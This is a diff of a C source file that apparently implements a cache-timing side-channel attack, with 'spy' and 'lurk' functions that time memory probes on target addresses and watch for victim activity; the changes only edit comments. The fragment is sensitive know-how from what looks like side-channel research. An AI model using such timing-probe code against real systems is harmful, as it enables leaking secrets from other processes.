@@ -158,7 +158,7 @@ adresses_t *file_loader(char *file_path)
     return adresses;
 }
 
-// spy
+// spy (actual attack/monitoring)
 void spy(char **target_adrs, int adrs_amount)
 {
     unsigned long long old_tsc, tsc = rdtsc();
@@ -175,13 +175,14 @@ void spy(char **target_adrs, int adrs_amount)
         for(int cur_adr_i=0;cur_adr_i<adrs_amount;cur_adr_i++)
         {
             char *ptr=target_adrs[cur_adr_i];
-            measurements[cur_adr_i][cur_slot]=probe(ptr);                                               // add timing to array for persistence 
+            measurements[cur_adr_i][cur_slot]=probe(ptr);                                         
         }
     }
-    writer(target_adrs, adrs_amount, measurements);
+    writer(target_adrs, adrs_amount, measurements); // write results to file
     printf("Spy finished!\n");
 }
 
+// detect/wait for victim activity
 void lurk(void *base, char **target_adrs, int adrs_amount)
 {
     unsigned long long old_tsc, tsc = rdtsc();
@@ -232,7 +233,6 @@ void control()
     munmap(base, map_len); // this will never be reached
 }
 
-// default address values (?)
 int main()
 {
     printf("starting\n");
